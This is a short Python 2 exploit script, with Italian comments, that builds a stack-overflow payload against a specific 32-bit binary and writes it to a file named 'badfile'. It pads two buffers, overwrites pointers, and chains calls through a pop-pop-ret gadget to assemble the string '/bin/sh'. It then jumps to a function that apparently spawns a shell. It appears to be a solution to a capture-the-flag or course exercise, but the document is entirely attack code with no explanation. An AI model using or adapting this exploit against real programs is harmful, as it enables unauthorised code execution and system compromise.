# coding=utf-8
import struct

string = 0x0804a060

str1 = 0x0804a0c8
str2 = 0x0804a0c4

pop_pop_ret = 0x080486ca 

lazy = 0x804851f
join_string = 0x80484fb

payload1 = "/bin/"
payload1 += "A"*123 #Sovrascrivo buffer
payload1 += struct.pack("I",str1)
payload1 += "\n"
payload1 += "sh" 
payload1 += "A"*146 #Sovrascrivo buffer1
payload1 += struct.pack("I",str2)
payload1 += "A"*8	#arrivo al ret di get_input
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", pop_pop_ret)
payload1 += struct.pack("I", string)
payload1 += struct.pack("I", str1)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", pop_pop_ret)
payload1 += struct.pack("I", string)
payload1 += struct.pack("I", str2)
payload1 += struct.pack("I", lazy)

f = open("badfile", "w")
f.write("%s" % payload1) 
f.close()